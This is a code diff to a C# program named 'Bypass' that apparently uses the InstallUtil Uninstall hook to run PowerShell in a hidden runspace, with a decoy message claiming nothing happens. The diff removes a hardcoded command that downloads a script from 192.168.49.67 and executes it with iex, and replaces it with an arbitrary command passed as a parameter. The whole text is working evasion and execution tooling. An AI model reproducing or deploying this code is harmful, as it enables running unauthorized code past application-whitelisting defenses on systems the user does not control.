@@ -9,6 +9,13 @@ namespace Bypass
     {
         static void Main(string[] args)
         {
+            // checking for cmd
+            string cmd = "";
+            if (args != null && args.Length > 0)
+            {
+                cmd = args[0];
+            }
+
             Console.WriteLine("Nothing going on in this binary.");
         }
     }
@@ -17,7 +24,13 @@ namespace Bypass
     {
         public override void Uninstall(System.Collections.IDictionary savedState)
         {
-            String cmd = "(New-Object Net.WebClient).DownloadString('http://192.168.49.67/run.txt') | iex";
+
+            string cmd = this.Context.Parameters["cmd"];
+            if (cmd == null)
+            {
+                throw new InstallException("Mandatory parameter 'cmd' empty");
+            }
+            
             Runspace rs = RunspaceFactory.CreateRunspace();
             rs.Open();
             PowerShell ps = PowerShell.Create();
